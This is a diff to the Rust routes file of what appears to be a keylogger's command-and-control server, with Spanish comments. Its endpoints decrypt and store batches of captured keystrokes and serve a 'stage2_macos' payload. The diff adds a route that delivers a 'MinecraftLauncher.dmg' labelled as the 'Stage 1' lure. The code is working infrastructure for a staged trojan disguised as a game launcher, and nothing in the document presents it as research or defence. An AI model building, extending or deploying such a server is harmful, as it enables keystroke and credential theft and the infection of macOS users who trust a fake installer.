@@ -1,14 +1,15 @@
 // routes.rs
 use axum::{
     extract::State,
-    http::StatusCode,
-    response::Json,
+    http::{StatusCode, header},
+    response::{Json, Response, IntoResponse},
     routing::{get, post},
     Router,
 };
 use std::sync::Arc;
 use crate::storage::Storage;
 use crate::crypto;
+use std::path::PathBuf;
 
 pub fn create_routes(storage: Storage) -> Router {
     Router::new()
@@ -23,14 +24,12 @@ pub async fn receive_key(
     State(storage): State<Arc<Storage>>,
     Json(payload): Json<serde_json::Value>,
 ) -> StatusCode {
-    // 1. Extraer el dato cifrado
     let encrypted = payload["data"].as_str().unwrap_or("");
     if encrypted.is_empty() {
         eprintln!("⚠️ No se recibió dato cifrado");
         return StatusCode::BAD_REQUEST;
     }
 
-    // 2. Descifrar
     let decrypted_str = match crypto::decrypt(encrypted) {
         Ok(s) => s,
         Err(e) => {
@@ -39,7 +38,6 @@ pub async fn receive_key(
         }
     };
 
-    // 3. Parsear el JSON descifrado
     let data: serde_json::Value = match serde_json::from_str(&decrypted_str) {
         Ok(v) => v,
         Err(e) => {
@@ -48,7 +46,6 @@ pub async fn receive_key(
         }
     };
 
-    // 4. Guardar en storage (ya descifrado)
     storage.add(data);
     StatusCode::CREATED
 }
@@ -61,14 +58,12 @@ pub async fn receive_keys_batch(
     println!("📦 Recibiendo {} teclas cifradas en lote", payloads.len());
 
     for encrypted_payload in payloads {
-        // 1. Extraer el dato cifrado
         let encrypted = encrypted_payload["data"].as_str().unwrap_or("");
         if encrypted.is_empty() {
             eprintln!("⚠️ Dato cifrado vacío en lote");
             continue;
         }
 
-        // 2. Descifrar
         let decrypted_str = match crypto::decrypt(encrypted) {
             Ok(s) => s,
             Err(e) => {
@@ -77,7 +72,6 @@ pub async fn receive_keys_batch(
             }
         };
 
-        // 3. Parsear JSON descifrado
         let data: serde_json::Value = match serde_json::from_str(&decrypted_str) {
             Ok(v) => v,
             Err(e) => {
@@ -86,7 +80,6 @@ pub async fn receive_keys_batch(
             }
         };
 
-        // 4. Guardar
         storage.add(data);
     }
 
@@ -100,7 +93,44 @@ pub async fn get_keys(
     Json(storage.get_all())
 }
 
-// Servir payload
+// Servir payload (Stage 2)
 pub async fn serve_payload() -> Vec<u8> {
     std::fs::read("./payloads/stage2_macos").unwrap_or_default()
+}
+
+// ============================================================
+// Servir la App de Minecraft (Stage 1) - CORREGIDO PARA .dmg
+// ============================================================
+
+pub async fn serve_stage1_app() -> Response {
+    // Ruta absoluta usando CARGO_MANIFEST_DIR
+    let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+        .join("payloads/MinecraftLauncher.dmg");
+
+    println!("📤 Intentando servir: {:?}", path);
+    println!("📤 ¿Existe? {}", path.exists());
+
+    match std::fs::metadata(&path) {
+        Ok(meta) => println!("📤 Tamaño: {} bytes", meta.len()),
+        Err(_) => println!("📤 Tamaño: N/A (no existe)"),
+    }
+
+    match std::fs::read(&path) {
+        Ok(data) => {
+            println!("✅ Archivo leído ({} bytes)", data.len());
+            Response::builder()
+                .status(StatusCode::OK)
+                .header("Content-Type", "application/x-apple-diskimage")
+                .header("Content-Disposition", "attachment; filename=\"MinecraftLauncher.dmg\"")
+                .body(axum::body::Body::from(data))
+                .unwrap()
+        }
+        Err(e) => {
+            eprintln!("❌ Error leyendo archivo: {}", e);
+            Response::builder()
+                .status(StatusCode::NOT_FOUND)
+                .body(axum::body::Body::from(format!("Archivo no encontrado: {}", e)))
+                .unwrap()
+        }
+    }
 }
